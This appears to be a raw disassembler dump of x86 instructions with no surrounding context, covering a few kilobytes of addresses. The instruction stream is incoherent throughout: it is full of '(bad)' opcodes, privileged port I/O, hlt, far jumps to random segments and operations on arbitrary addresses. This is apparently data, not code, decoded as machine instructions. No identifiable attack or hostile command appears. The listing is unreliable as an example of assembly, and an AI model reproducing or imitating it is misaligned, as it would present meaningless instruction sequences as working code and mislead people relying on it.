  41dd08:	adc    DWORD PTR [edx],esp
  41dd0a:	jle    0x41dd37
  41dd0c:	in     eax,0x5e
  41dd0e:	imul   edx,DWORD PTR [edx],0x92279706
  41dd14:	sub    BYTE PTR [edx+edi*4],bl
  41dd17:	loope  0x41dd71
  41dd19:	cmp    edi,esi
  41dd1b:	jmp    0xff94:0xd8ac8a04
  41dd22:	call   0x50079861
  41dd27:	pop    eax
  41dd28:	ror    DWORD PTR [edx+ebp*2-0xe],cl
  41dd2c:	fs jl  0x41dd67
  41dd2f:	fcom   DWORD PTR [ecx+0x2b]
  41dd32:	ja     0x41dd50
  41dd34:	hlt    
  41dd35:	jmp    0x7748:0x861e38a7
  41dd3c:	inc    eax
  41dd3d:	mov    eax,ds:0xa76ae190
  41dd42:	aas    
  41dd43:	sahf   
  41dd44:	out    dx,al
  41dd45:	popf   
  41dd46:	dec    esp
  41dd47:	mov    bh,0xa3
  41dd49:	fist   WORD PTR [ecx+edx*8-0x66]
  41dd4d:	out    0x85,al
  41dd4f:	outs   dx,BYTE PTR ds:[esi]
  41dd50:	jnp    0x41dd30
  41dd52:	jp     0x41dd6c
  41dd54:	mov    edi,0x258777e1
  41dd59:	sbb    dl,BYTE PTR [eax+0x5f]
  41dd5c:	lods   al,BYTE PTR ds:[esi]
  41dd5d:	push   ds
  41dd5e:	xor    bl,al
  41dd60:	inc    ebx
  41dd61:	adc    al,0x18
  41dd63:	cdq    
  41dd64:	hlt    
  41dd65:	fild   WORD PTR ds:0xa37e783
  41dd6b:	ja     0x41dd54
  41dd6d:	push   esp
  41dd6e:	mov    cl,0x6d
  41dd70:	(bad)  
  41dd71:	pop    ds
  41dd72:	adc    bl,0xc7
  41dd75:	mov    esi,0xbc391791
  41dd7a:	leave  
  41dd7b:	and    DWORD PTR [ebx+0x303c4ec1],0x1c
  41dd82:	pop    esi
  41dd83:	sub    eax,0xeecc38b6
  41dd88:	imul   esp,edx,0x4d
  41dd8b:	int3   
  41dd8c:	stos   BYTE PTR es:[edi],al
  41dd8d:	retf   0xbc0d
	...
  41dd98:	add    BYTE PTR [eax],al
  41dd9a:	add    BYTE PTR [eax],bh
  41dd9c:	push   0xffffff96
  41dd9e:	add    edx,esi
  41dda0:	(bad)  
  41dda1:	mov    ebp,0xdb4ef67b
  41dda6:	out    0x96,eax
  41dda8:	jb     0x41de16
  41ddaa:	(bad)  
  41ddab:	cld    
  41ddac:	fwait
  41ddad:	add    DWORD PTR [eax],eax
  41ddaf:	lods   eax,DWORD PTR ds:[esi]
  41ddb0:	add    BYTE PTR [eax],al
  41ddb2:	add    ah,ch
  41ddb4:	push   ebx
  41ddb5:	inc    edi
  41ddb6:	pop    edx
  41ddb7:	adc    ah,ah
  41ddb9:	and    BYTE PTR [eax+0x5099cb25],0x92
  41ddc0:	mov    BYTE PTR [edi+0x35],dl
  41ddc3:	or     eax,0x5b10ef91
  41ddc8:	jns    0x41dd9a
  41ddca:	call   0x5e07:0xe3be0c3
  41ddd1:	fs pop ebx
  41ddd3:	in     al,dx
  41ddd4:	sub    eax,DWORD PTR [ecx-0x5dc3ee7c]
  41ddda:	pop    esi
  41dddb:	dec    BYTE PTR [edi-0x11757ab9]
  41dde1:	adc    eax,0xdcc3dedb
  41dde6:	je     0x41dd8b
  41dde8:	call   0x2f85:0x243e2b96
  41ddef:	mov    bh,0xe
  41ddf1:	fwait
  41ddf2:	and    bl,ah
  41ddf4:	mov    ebx,0x50fa5b10
  41ddf9:	jnp    0x41ddc5
  41ddfb:	hlt    
  41ddfc:	scas   al,BYTE PTR es:[edi]
  41ddfd:	nop
  41ddfe:	call   0x83a90e70
  41de03:	mov    ?,WORD PTR [ecx+0x6f27f216]
  41de09:	aas    
  41de0a:	icebp  
  41de0b:	jg     0x41ddd3
  41de0d:	push   0xafc96511
  41de12:	inc    ecx
  41de13:	in     eax,dx
  41de14:	dec    ecx
  41de15:	in     al,dx
  41de16:	xor    al,0x22
  41de18:	inc    ecx
  41de19:	stc    
  41de1a:	sti    
  41de1b:	leave  
  41de1c:	adc    esp,0x8042245d
  41de22:	xchg   ecx,eax
  41de23:	mov    dh,0xff
  41de25:	(bad)  
  41de26:	cmp    al,ch
  41de28:	popf   
  41de29:	bound  eax,QWORD PTR [eax+0x5e]
  41de2c:	arpl   WORD PTR [ebx-0x1e625914],bx
  41de32:	mov    esp,DWORD PTR [edx-0x36688403]
  41de38:	inc    ebp
  41de39:	add    DWORD PTR [edx+0x43],esi
  41de3c:	retf   
  41de3d:	stc    
  41de3e:	loop   0x41de9b
  41de40:	push   ebx
  41de41:	mov    dh,0xf2
  41de43:	sub    esp,DWORD PTR [eax+0x145133]
  41de49:	dec    ecx
  41de4a:	jmp    0x61d4:0x4a8f3aad
  41de51:	fimul  DWORD PTR [edi+esi*8+0x14]
  41de55:	cdq    
  41de56:	push   ds
  41de57:	xlat   BYTE PTR ds:[ebx]
  41de58:	xchg   BYTE PTR [edx+0x6a33255c],dl
  41de5e:	mov    WORD PTR [ecx+0x0],es
	...
  41de69:	add    BYTE PTR [eax],al
  41de6b:	jmp    0x7a725929
  41de70:	repz jmp 0x41de6c
  41de73:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41de77:	pop    edi
  41de78:	mov    bh,0x21
  41de7a:	fisubr DWORD PTR [ecx-0x52fffe64]
  41de80:	add    BYTE PTR [eax],al
  41de82:	add    BYTE PTR [ebp-0x4a],bh
  41de85:	or     eax,0x21e097d2
  41de8a:	jmp    0x6b53d085
  41de8f:	rcr    ah,0x1b
  41de92:	push   0x7edf3e91
  41de97:	std    
  41de98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de99:	loope  0x41debe
  41de9b:	or     BYTE PTR ds:0xabe38a86,0xe3
  41dea2:	and    al,0xe8
  41dea4:	inc    eax
  41dea5:	ja     0x41deac
  41dea7:	sub    BYTE PTR [esi+0x224de832],bh
  41dead:	or     BYTE PTR [edx],ah
  41deaf:	mov    dl,0xf4
  41deb1:	fwait
  41deb2:	push   cs
  41deb3:	les    ebp,FWORD PTR [esi-0x5e]
  41deb6:	not    BYTE PTR [ebx-0x604a56c3]
  41debc:	scas   eax,DWORD PTR es:[edi]
  41debd:	popf   
  41debe:	retf   0xc003
  41dec1:	cwde   
  41dec2:	mov    edx,0xd56bbec4
  41dec7:	js     0x41df00
  41dec9:	fdiv   QWORD PTR [ecx-0x14]
  41decc:	push   eax
  41decd:	leave  
  41dece:	in     al,dx
  41decf:	ror    DWORD PTR [eax-0x23e841a0],1
  41ded5:	inc    esi
  41ded6:	or     bl,BYTE PTR [esi+ebp*2-0x38c7eaeb]
  41dedd:	sbb    eax,0x41d5cde7
  41dee2:	ins    BYTE PTR es:[edi],dx
  41dee3:	fsubr  DWORD PTR [esp+esi*4-0x3f5ccdfe]
  41deea:	loop   0x41df49
  41deec:	mov    BYTE PTR [edi+0x47],bh
  41deef:	xchg   ecx,eax
  41def0:	sub    esp,DWORD PTR [ecx+0x4c]
  41def3:	jns    0x41df54
  41def5:	mov    dl,0x5a
  41def7:	and    dh,BYTE PTR [ecx-0x76c81aa9]
  41defd:	sub    DWORD PTR [ebx-0xeaff5eb],0xffffffc0
  41df04:	ds test eax,0x1a4a70d8
  41df0a:	mov    al,ds:0xff47096d
  41df0f:	jg     0x41de93
  41df11:	into   
  41df12:	adc    al,0xa1
  41df14:	jp     0x41df2a
  41df16:	or     al,0x1b
  41df18:	add    bh,cl
  41df1a:	(bad)  
  41df1b:	out    dx,eax
  41df1c:	imul   esi,ebx,0x8f7f539d
  41df22:	or     BYTE PTR [ecx-0x48de7c24],al
  41df28:	shl    esi,cl
  41df2a:	sbb    BYTE PTR [ebp+0x61],0x55
  41df2e:	mov    ebp,0xd0
	...
  41df3b:	pop    ebx
  41df3c:	inc    ecx
  41df3d:	pop    ebx
  41df3e:	iret   
  41df3f:	pop    ebx
  41df40:	(bad)  
  41df42:	aad    0xf
  41df44:	ss dec esp
  41df46:	dec    esi
  41df47:	(bad)  
  41df48:	or     ebx,DWORD PTR [edx]
  41df4a:	adc    DWORD PTR [esi-0x63],edx
  41df4d:	add    DWORD PTR [eax],eax
  41df4f:	lods   eax,DWORD PTR ds:[esi]
  41df50:	add    BYTE PTR [eax],al
  41df52:	add    BYTE PTR [eax+0x5ff564e1],bl
  41df58:	xchg   ebp,eax
  41df59:	lds    esi,FWORD PTR [esi+0x28]
  41df5c:	xchg   BYTE PTR [esi],cl
  41df5e:	loop   0x41dfb5
  41df60:	mov    al,0x94
  41df62:	cmp    cl,al
  41df64:	in     eax,dx
  41df65:	mov    fs,WORD PTR [edx+0x192423c]
  41df6b:	mov    dh,0x3f
  41df6d:	dec    esp
  41df6e:	mov    ah,0xf9
  41df70:	scas   al,BYTE PTR es:[edi]
  41df71:	fidiv  WORD PTR fs:[ecx]
  41df74:	fdiv   DWORD PTR [edi]
  41df76:	call   0x2282:0x98a7b3ba
  41df7d:	inc    ebp
  41df7e:	push   ecx
  41df7f:	mov    bl,0xf8
  41df81:	cmp    DWORD PTR [ebp+0xe5d5da2],0xa73c4106
  41df8b:	xor    dh,cl
  41df8d:	cmp    bh,cl
  41df8f:	dec    edx
  41df90:	mov    ecx,0x607a2e1a
  41df95:	outs   dx,DWORD PTR ds:[si]
  41df97:	or     DWORD PTR [ecx-0x20da9993],esp
  41df9d:	cmp    BYTE PTR [edi+0x6d],dl
  41dfa0:	retf   0xcf53
  41dfa3:	jb     0x41df27
  41dfa5:	or     eax,0xb2a64e42
  41dfaa:	xor    eax,0x5b1b5411
  41dfaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfb0:	dec    ecx
  41dfb1:	mov    ch,0xd5
  41dfb3:	or     DWORD PTR [esp+edi*8+0x5ebca0fa],esi
  41dfba:	inc    eax
  41dfbb:	inc    esi
  41dfbc:	cmp    eax,0xbb9b6e0d
  41dfc1:	mov    ebx,0x53792e5f
  41dfc6:	sub    ebp,DWORD PTR [ebx-0x5032169e]
  41dfcc:	xchg   esi,eax
  41dfcd:	and    ch,BYTE PTR [ecx]
  41dfcf:	mov    esp,0x6b6a2875
  41dfd4:	shr    DWORD PTR [ebx-0x4a],1
  41dfd7:	adc    BYTE PTR [ecx],cl
  41dfd9:	fsub   st,st(7)
  41dfdb:	cmp    al,0x27
  41dfdd:	xchg   BYTE PTR [ecx+0x5faac5a0],dh
  41dfe3:	mov    ebp,0x4c27fd11
  41dfe8:	mov    DWORD PTR [ecx-0x1],edx
  41dfeb:	pop    es
  41dfec:	test   BYTE PTR [bp+di-0x4d],0xa7
  41dff1:	lea    edx,[ecx]
  41dff3:	adc    eax,DWORD PTR [eax-0x15b4e587]
  41dff9:	jg     0x41df91
  41dffb:	mov    ds:0x20604b95,al
	...
  41e008:	add    BYTE PTR [eax],al
  41e00a:	add    BYTE PTR [ebx+0x7f3c6585],bl
  41e010:	cld    
  41e011:	(bad)  [edi-0x65be08a1]
  41e017:	xor    al,0x28
  41e019:	and    eax,0x19e03a5
  41e01e:	add    BYTE PTR [ebp-0x20000000],ch
  41e024:	in     al,0x8c
  41e026:	mov    ch,0x71
  41e028:	dec    edi
  41e029:	and    al,0x1c
  41e02b:	cwde   
  41e02c:	in     al,0x38
  41e02e:	dec    ebx
  41e02f:	test   eax,0x27e905b4
  41e034:	fdivr  DWORD PTR [si-0x65]
  41e038:	nop
  41e039:	enter  0xf6de,0x1f
  41e03d:	pop    eax
  41e03e:	movzx  ebp,WORD PTR [edx]
  41e041:	dec    ecx
  41e042:	fisub  WORD PTR [ecx]
  41e044:	or     al,0x2b
  41e046:	clc    
  41e047:	mov    ds:0xa40e4d4,eax
  41e04c:	(bad)  
  41e04d:	dec    ebx
  41e04e:	dec    esp
  41e04f:	jbe    0x41e003
  41e051:	xchg   DWORD PTR [ebp-0x1a],ebp
  41e054:	cmp    BYTE PTR [ecx+0x3a],cl
  41e057:	xchg   esp,eax
  41e058:	cmp    BYTE PTR [eax-0x1b014c55],bl
  41e05e:	mov    ds:0xc4f27628,al
  41e063:	fsub   DWORD PTR [ebx]
  41e065:	jo     0x41e0bc
  41e067:	pop    edi
  41e068:	mov    dh,0xef
  41e06a:	cli    
  41e06b:	fdivr  DWORD PTR [eax+eax*1-0x4]
  41e06f:	and    eax,0xc07fcede
  41e074:	mov    ecx,0xbc892c6a
  41e079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e07a:	cmc    
  41e07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e07c:	(bad)  
  41e07d:	cmp    ecx,DWORD PTR [ebp+0x3d]
  41e080:	or     DWORD PTR [ebx],ebx
  41e082:	nop
  41e083:	iret   
  41e084:	retf   0x980b
  41e087:	imul   esp,DWORD PTR [esi+0x3b7bed57],0x24
  41e08e:	mov    ebp,0x4733fbc9
  41e093:	ret    
  41e094:	es loope 0x41e0c2
  41e097:	xchg   ecx,eax
  41e098:	ja     0x41e045
  41e09a:	clc    
  41e09b:	call   0x1efac304
  41e0a0:	jns    0x41e070
  41e0a2:	jge    0x41e02f
  41e0a4:	push   esi
  41e0a5:	add    eax,0x7cb4412d
  41e0aa:	sbb    bl,bl
  41e0ac:	shr    BYTE PTR [ebp+0x675459f0],1
  41e0b2:	mov    es,WORD PTR [ecx+0x3e61b750]
  41e0b8:	sahf   
  41e0b9:	and    BYTE PTR [esi+ebx*1-0x61],bl
  41e0bd:	pop    ds
  41e0be:	imul   esp,ebp,0x74
  41e0c1:	mov    edx,0xfd80a87e
  41e0c6:	pop    esi
  41e0c7:	jle    0x41e0d9
  41e0c9:	sbb    ah,cl
  41e0cb:	cld    
  41e0cc:	xor    eax,0x7ebc59
	...
  41e0d9:	add    BYTE PTR [eax],al
  41e0db:	outs   dx,BYTE PTR ds:[esi]
  41e0dc:	jae    0x41e0ce
  41e0de:	retf   0xcbfd
  41e0e1:	jle    0x41e0da
  41e0e3:	repz xor eax,0xb40f8ce9
  41e0e9:	aaa    
  41e0ea:	pop    ds
  41e0eb:	mov    al,0x9e
  41e0ed:	add    DWORD PTR [eax],eax
  41e0ef:	lods   eax,DWORD PTR ds:[esi]
  41e0f0:	add    BYTE PTR [eax],al
  41e0f2:	add    BYTE PTR [ecx-0xccf6919],dl
  41e0f8:	aam    0xe0
  41e0fa:	in     al,dx
  41e0fb:	or     DWORD PTR [edi+0x40bf9a98],0x6f
  41e102:	popf   
  41e103:	bound  edi,QWORD PTR [edi]
  41e105:	mov    eax,0xb2c8cf3d
  41e10a:	inc    edx
  41e10b:	cmp    al,0xee
  41e10d:	jne    0x41e17b
  41e10f:	cdq    
  41e110:	xchg   DWORD PTR [ecx],ecx
  41e112:	gs xchg ebp,eax
  41e114:	aam    0x3d
  41e116:	(bad)  
  41e117:	xor    ah,BYTE PTR [ebx+0x34f4c906]
  41e11d:	scas   al,BYTE PTR es:[edi]
  41e11e:	xchg   esi,eax
  41e11f:	mov    dl,BYTE PTR ds:0xb7ff25c9
  41e125:	jbe    0x41e11d
  41e127:	(bad)  
  41e128:	popf   
  41e129:	cmp    dh,BYTE PTR [eax+0x31]
  41e12c:	rol    BYTE PTR [ecx-0x2893ee8b],0x71
  41e133:	ret    
  41e134:	dec    ecx
  41e135:	lock add esi,DWORD PTR [bx+si]
  41e139:	mov    eax,ds:0x497df3f
  41e13e:	inc    edx
  41e13f:	jmp    0x41e118
  41e141:	sbb    al,0xce
  41e143:	or     cl,BYTE PTR [esi-0x45]
  41e146:	dec    eax
  41e147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e148:	pop    ss
  41e149:	xor    DWORD PTR [ecx-0x3e],ecx
  41e14c:	pusha  
  41e14d:	xchg   BYTE PTR [ecx-0x67],dl
  41e150:	mov    ecx,0x6f112c51
  41e155:	fs jle 0x41e163
  41e158:	mov    ebx,0xd73d6c6f
  41e15d:	scas   al,BYTE PTR es:[edi]
  41e15e:	sbb    al,0xff
  41e160:	xchg   esp,eax
  41e161:	dec    eax
  41e162:	ja     0x41e198
  41e164:	and    esp,ecx
  41e166:	mov    bl,0xc0
  41e168:	or     eax,0x95d59038
  41e16d:	sbb    al,0xf1
  41e16f:	jmp    0x99996880
  41e174:	sar    BYTE PTR [ecx+0x25],cl
  41e177:	jno    0x41e100
  41e179:	fs push ds
  41e17b:	xchg   ebx,eax
  41e17c:	int    0x85
  41e17e:	shl    DWORD PTR [ebx],cl
  41e180:	cmp    BYTE PTR [ebp-0x4c],dl
  41e183:	xchg   edi,eax
  41e184:	cld    
  41e185:	push   es
  41e186:	mov    esi,0x5a95871
  41e18b:	daa    
  41e18c:	(bad)  
  41e18d:	adc    ch,ah
  41e18f:	add    eax,0x2476d7ce
  41e194:	jle    0x41e198
  41e196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e197:	jno    0x41e173
  41e199:	jle    0x41e18d
  41e19b:	or     bh,bh
  41e19d:	mov    ah,0xa6
  41e19f:	sub    BYTE PTR [eax],al
	...
  41e1a9:	add    BYTE PTR [eax],al
  41e1ab:	cmc    
  41e1ac:	adc    al,0xae
  41e1ae:	adc    ebp,edi
  41e1b0:	mov    ebx,0x84e6f6fd
  41e1b5:	lds    ebp,FWORD PTR [edx-0x369dd500]
  41e1bb:	pop    ebp
  41e1bc:	lahf   
  41e1bd:	add    DWORD PTR [eax],eax
  41e1bf:	lods   eax,DWORD PTR ds:[esi]
  41e1c0:	add    BYTE PTR [eax],al
  41e1c2:	add    bl,ah
  41e1c4:	(bad)  
  41e1c5:	sbb    ecx,DWORD PTR [ebx-0x1ef86d92]
  41e1cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e1cc:	gs dec ebp
  41e1ce:	shl    DWORD PTR [esi],cl
  41e1d0:	(bad)  
  41e1d1:	jmp    0x1262e7a4
  41e1d6:	outs   dx,BYTE PTR ds:[esi]
  41e1d7:	pop    ecx
  41e1d8:	shl    BYTE PTR [eax-0x70],cl
  41e1db:	daa    
  41e1dc:	aad    0xc
  41e1de:	inc    esi
  41e1df:	out    0xba,al
  41e1e1:	or     DWORD PTR [eax+0x48],ebp
  41e1e4:	not    DWORD PTR [edi-0x50cfd75d]
  41e1ea:	xor    eax,0x36a7e90d
  41e1ef:	imul   esi,DWORD PTR [esi-0x74],0x236848ed
  41e1f6:	out    0x5,eax
  41e1f8:	in     al,dx
  41e1f9:	or     ebx,DWORD PTR [eax-0x11]
  41e1fc:	stc    
  41e1fd:	jg     0x41e21b
  41e1ff:	xchg   esp,eax
  41e200:	sbb    bh,BYTE PTR [edx+0xa9518a]
  41e206:	mov    ebx,gs
  41e208:	xor    edx,DWORD PTR [edx+0x625571ff]
  41e20e:	jmp    0x27b6:0xe31d5419
  41e215:	jge    0x41e1b8
  41e217:	sub    DWORD PTR [ebx+edx*4],edi
  41e21a:	shl    BYTE PTR [ecx+ebx*2-0x754a5474],0x77
  41e222:	sbb    al,0x33
  41e224:	hlt    
  41e225:	and    BYTE PTR [eax-0x14],0x25
  41e229:	nop
  41e22a:	mov    ebx,0xe5077321
  41e22f:	jge    0x41e27f
  41e231:	bound  esp,QWORD PTR [edx-0x52]
  41e234:	js     0x41e20e
  41e236:	mov    bh,0xe6
  41e238:	out    dx,eax
  41e239:	inc    ebp
  41e23a:	fcom   QWORD PTR [esi-0x7e]
  41e23d:	out    0x51,al
  41e23f:	jne    0x41e21c
  41e241:	jne    0x41e257
  41e243:	and    ch,BYTE PTR [edx-0x4007bc0e]
  41e249:	sub    eax,0xd4fafefc
  41e24e:	cmp    al,0xf6
  41e250:	mov    edi,0xed8e202f
  41e255:	stc    
  41e256:	fcmovu st,st(2)
  41e258:	in     eax,0x14
  41e25a:	in     eax,dx
  41e25b:	mov    ebx,DWORD PTR [edx-0x4c7acaf7]
  41e261:	xchg   ebp,eax
  41e262:	or     DWORD PTR [edi-0x70],ebx
  41e265:	fwait
  41e266:	adc    dl,BYTE PTR [edx]
  41e268:	popf   
  41e269:	cwde   
  41e26a:	leave  
  41e26b:	lahf   
  41e26c:	push   0x3f
  41e26e:	and    al,0xa1
	...
  41e278:	add    BYTE PTR [eax],al
  41e27a:	add    BYTE PTR [ebx],bh
  41e27c:	mov    cl,0x57
  41e27e:	lock fcomip st,st(6)
  41e281:	mov    edi,0xbb1c16fb
  41e286:	shl    BYTE PTR [eax+ebp*1-0x4e],0x5d
  41e28b:	or     ah,BYTE PTR [eax+0xad0001]
  41e291:	add    BYTE PTR [eax],al
  41e293:	fsub   DWORD PTR [edx-0x76465266]
  41e299:	mov    ch,BYTE PTR [edi]
  41e29b:	jle    0x41e2e7
  41e29d:	push   ebx
  41e29e:	push   0xfd9b64f7
  41e2a3:	repz adc ebp,DWORD PTR [esi]
  41e2a6:	or     DWORD PTR [ecx-0x2],0x3119ab21
  41e2ad:	xchg   esi,eax
  41e2ae:	loope  0x41e2c0
  41e2b0:	aaa    
  41e2b1:	and    al,0x1d
  41e2b3:	mov    eax,0x8f9a489a
  41e2b8:	stos   DWORD PTR es:[edi],eax
  41e2b9:	jae    0x41e2be
  41e2bb:	pop    ds
  41e2bc:	dec    edx
  41e2bd:	jns    0x41e2dc
  41e2bf:	iret   
  41e2c0:	repnz mov cs,ebx
  41e2c3:	mov    edi,0xe1d2df7c
  41e2c8:	sbb    al,0x2d
  41e2ca:	dec    edi
  41e2cb:	dec    edx
  41e2cc:	and    BYTE PTR [eax],dl
  41e2ce:	fisttp QWORD PTR [edx-0x354b2f1d]
  41e2d4:	ins    BYTE PTR es:[edi],dx
  41e2d5:	jecxz  0x41e308
  41e2d7:	jne    0x41e323
  41e2d9:	int3   
  41e2da:	scas   eax,DWORD PTR es:[edi]
  41e2db:	sub    ebx,esi
  41e2dd:	ds push ebp
  41e2df:	xor    BYTE PTR [eax+eiz*2],al
  41e2e2:	sub    ecx,DWORD PTR [esi+0x119a09d3]
  41e2e8:	sub    al,0x2d
  41e2ea:	jo     0x41e35d
  41e2ec:	cmp    eax,0x38b5c2d6
  41e2f1:	push   ecx
  41e2f2:	xchg   ebx,eax
  41e2f3:	jge    0x41e2bc
  41e2f5:	mov    esp,0xa35c08b5
  41e2fa:	mov    bl,0xaf
  41e2fc:	jnp    0x41e2de
  41e2fe:	inc    ebp
  41e2ff:	adc    eax,0xc742e4bf
  41e304:	adc    esp,ecx
  41e306:	stos   BYTE PTR es:[edi],al
  41e307:	add    al,0xee
  41e309:	cmp    eax,0xf3d4126b
  41e30e:	cmp    al,0x89
  41e310:	(bad)
  41e314:	retf   0x5374
  41e317:	retf   0x4e82
  41e31a:	jmp    DWORD PTR [ebx-0x2146e2c5]
  41e320:	xor    al,bh
  41e322:	ret    0x7f9e
  41e325:	inc    ebx
  41e326:	pop    es
  41e327:	jp     0x41e388
  41e329:	call   0x4fe9b067
  41e32e:	repnz in al,dx
  41e330:	call   FWORD PTR [esp+edi*1]
  41e333:	and    al,BYTE PTR [edx-0x45bb11ac]
  41e339:	sub    eax,0x220c9acb
  41e33e:	lods   al,BYTE PTR ds:[esi]
  41e33f:	jo     0x41e341
	...
  41e349:	add    BYTE PTR [eax],al
  41e34b:	aam    0xf
  41e34d:	push   ecx
  41e34e:	lock (bad) 
  41e351:	cmc    
  41e352:	das    
  41e353:	sbb    BYTE PTR [eax],cl
  41e355:	xchg   ebx,eax
  41e356:	iret   
  41e357:	add    ah,BYTE PTR [ecx-0x5f48da0f]
  41e35d:	add    DWORD PTR [eax],eax
  41e35f:	lods   eax,DWORD PTR ds:[esi]
  41e360:	add    BYTE PTR [eax],al
  41e362:	add    dh,ah
  41e364:	scas   eax,DWORD PTR es:[edi]
  41e365:	jns    0x41e32f
  41e367:	(bad)  
  41e368:	js     0x41e3d4
  41e36a:	lahf   
  41e36b:	enter  0x3616,0x42
  41e36f:	mov    ecx,0x17e89cc
  41e374:	sbb    edx,DWORD PTR [eax+0x18d8c6b6]
  41e37a:	dec    eax
  41e37b:	scas   eax,DWORD PTR es:[edi]
  41e37c:	addr16 cli 
  41e37e:	add    al,0x12
  41e380:	sahf   
  41e381:	fsub   QWORD PTR [edx]
  41e383:	jge    0x41e3c0
  41e385:	bswap  eax
  41e387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e388:	scas   eax,DWORD PTR es:[edi]
  41e389:	push   ebx
  41e38a:	push   edi
  41e38b:	or     DWORD PTR [edx+0x11],edi
  41e38e:	out    dx,eax
  41e38f:	push   esi
  41e390:	packsswb mm2,mm6
  41e393:	rcl    edx,1
  41e395:	data16 (bad) 
  41e397:	pop    ss
  41e398:	or     ebx,DWORD PTR [eax-0x1a279480]
  41e39e:	imul   esp,esp,0x7db2c1c7
  41e3a4:	lods   eax,DWORD PTR ds:[esi]
  41e3a5:	lea    edi,[ebx]
  41e3a7:	outs   dx,BYTE PTR ds:[esi]
  41e3a8:	iret   
  41e3a9:	or     esp,DWORD PTR [edx*2+0x504beb24]
  41e3b0:	xchg   ecx,eax
  41e3b1:	mov    edi,0x74816fb3
  41e3b6:	xor    eax,0x80bf011c
  41e3bb:	imul   ecx,DWORD PTR [eax+0x342ec848],0x6d813891
  41e3c5:	dec    edx
  41e3c6:	call   0xb7504b91
  41e3cb:	sub    BYTE PTR [edx],0x61
  41e3ce:	cmp    al,0x4e
  41e3d0:	ins    BYTE PTR es:[edi],dx
  41e3d1:	or     BYTE PTR [eax+0x7c],ah
  41e3d4:	hlt    
  41e3d5:	adc    ebp,DWORD PTR [edi]
  41e3d7:	xchg   esi,eax
  41e3d8:	push   esi
  41e3d9:	cmp    esp,DWORD PTR [edx+0x5322a48b]
  41e3df:	cmp    al,0xb7
  41e3e1:	lds    esp,FWORD PTR [edx]
  41e3e3:	push   0xffffffeb
  41e3e5:	cmp    cl,ch
  41e3e7:	in     eax,dx
  41e3e8:	sub    ecx,DWORD PTR [ecx]
  41e3ea:	cmp    eax,DWORD PTR [ebx+0x66140b63]
  41e3f0:	into   
  41e3f1:	(bad)  
  41e3f2:	mov    ch,0xbb
  41e3f4:	dec    eax
  41e3f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3f6:	test   DWORD PTR [edi],eax
  41e3f8:	aaa    
  41e3f9:	ins    DWORD PTR es:[edi],dx
  41e3fa:	sar    DWORD PTR [edi],cl
  41e3fc:	push   cs
  41e3fd:	or     cl,BYTE PTR [ebx+0x24]
  41e400:	dec    ebp
  41e401:	push   cs
  41e402:	inc    ebp
  41e403:	pop    esp
  41e404:	shl    DWORD PTR ds:0xd1457f24,cl
  41e40a:	fmul   DWORD PTR [ecx-0x12113db3]
	...
  41e418:	add    BYTE PTR [eax],al
  41e41a:	add    ch,cl
  41e41c:	sub    eax,0xfbf54395
  41e421:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e427:	mov    ebp,0x64d2fa95
  41e42c:	mov    eax,ds:0xad0001
  41e431:	add    BYTE PTR [eax],al
  41e433:	xchg   esp,eax
  41e434:	sbb    DWORD PTR [ecx+esi*4],edx
  41e437:	sbb    eax,DWORD PTR [edi]
  41e439:	jl     0x41e40a
  41e43b:	sub    DWORD PTR [esi+0x4fd4d1ad],0x528bbb4c
  41e445:	add    DWORD PTR [edx],eax
  41e447:	and    al,0x36
  41e449:	jg     0x41e4b9
  41e44b:	popf   
  41e44c:	mov    al,0x32
  41e44e:	and    DWORD PTR [ecx+0x27],ebx
  41e451:	shr    dh,cl
  41e453:	js     0x41e44a
  41e455:	push   edx
  41e456:	jmp    0x3267:0xe2588a98
  41e45d:	xor    al,0xb1
  41e45f:	lods   al,BYTE PTR ds:[esi]
  41e460:	mov    DWORD PTR [eax+0x4c9989b3],edi
  41e466:	into   
  41e467:	mov    ds:0xdffe9c32,al
  41e46c:	cdq    
  41e46d:	mov    edi,0x79a3fd6
  41e472:	sbb    al,0x8d
  41e474:	fstp   QWORD PTR [edi+eiz*2+0x4e665189]
  41e47b:	int3   
  41e47c:	inc    ebp
  41e47d:	dec    eax
  41e47e:	sti    
  41e47f:	(bad)  
  41e480:	movq   mm2,mm6
  41e483:	dec    eax
  41e484:	pusha  
  41e485:	dec    ebx
  41e486:	cmp    BYTE PTR [edx+0x16],bh
  41e489:	pop    esp
  41e48a:	sub    DWORD PTR [edx*2-0x42b58d44],esi
  41e491:	cmp    eax,0x80e55291
  41e496:	jmp    0x41e428
  41e498:	xlat   BYTE PTR ds:[ebx]
  41e499:	push   esi
  41e49a:	out    dx,eax
  41e49b:	xchg   BYTE PTR [edi+edx*4],bh
  41e49e:	dec    dl
  41e4a0:	out    dx,al
  41e4a1:	imul   esp,DWORD PTR [ebp-0x35],0x5e
  41e4a5:	rol    ch,1
  41e4a7:	pop    ss
  41e4a8:	mov    al,ds:0x6b3bcd3e
  41e4ad:	ins    BYTE PTR es:[edi],dx
  41e4ae:	dec    BYTE PTR [ebp+edx*2-0x5d6ed790]
  41e4b5:	lds    esi,FWORD PTR ds:0x3e230578
  41e4bb:	bound  ebx,QWORD PTR [edi]
  41e4bd:	mov    edx,0x6df14a8d
  41e4c2:	pushf  
  41e4c3:	mov    dl,0x13
  41e4c5:	out    dx,al
  41e4c6:	fiadd  DWORD PTR [esp+ecx*2-0x36c84e20]
  41e4cd:	pop    ebp
  41e4ce:	bound  eax,QWORD PTR [edi+0x506539c4]
  41e4d4:	mov    BYTE PTR [ecx-0xb1ec51c],ch
  41e4da:	pushf  
  41e4db:	sbb    ebx,DWORD PTR [eax]
  41e4dd:	cli    
  41e4de:	fwait
  41e4df:	add    BYTE PTR ss:[eax],al
	...
  41e4ea:	add    BYTE PTR [ebx],dl
  41e4ec:	fs out 0xb,eax
  41e4ef:	test   DWORD PTR [ebx-0xce58301],0x8d654cfc
  41e4f9:	pop    edx
  41e4fa:	pop    ebx
